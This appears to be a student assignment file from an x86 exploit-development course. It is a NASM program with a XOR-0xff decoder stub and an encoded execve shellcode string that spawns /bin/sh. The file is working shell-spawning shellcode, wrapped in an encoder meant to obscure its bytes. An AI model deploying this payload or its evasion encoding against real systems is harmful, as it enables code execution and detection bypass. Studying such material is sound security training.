; Student ID   : SLAE-1250
; Student Name : Jonathan "Chops" Crosby
; Assignment 4 : Custom Encoder (Linux/x86) Assembly
; File Name    : custom-encoder.nasm

global _start

section .text

_start:

        jmp short call_shellcode ; using the jump, call and pop method to get into our shellcode

decoder:
        pop esi                  ; get the address of EncodedShellcode into esi

decode:
        mov bl, byte [esi]       ; moving current byte from shellcode string

        xor bl, 0xff             ; checking if we are done decoding and should
                                 ; jump directly to our shell code 

        jz EncodedShellcode      ; if the current value being evaluated is 0xff
                                 ; then we are at the end of the string 

        mov byte [esi], bl       ; a by product of the xor is that we get the difference
                                 ; between 0xff and the current encoded byte being evaluated
                                 ; which is infact the actual instruction value to execute!

        inc esi                  ; move to next byte to be evaluated in our shellcode

        jmp short decode         ; run through decode again

call_shellcode:

        call decoder    ; call our decoder routine

        ; this is our encoded shell string for execve-stack
        EncodedShellcode: db 0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f,0xff
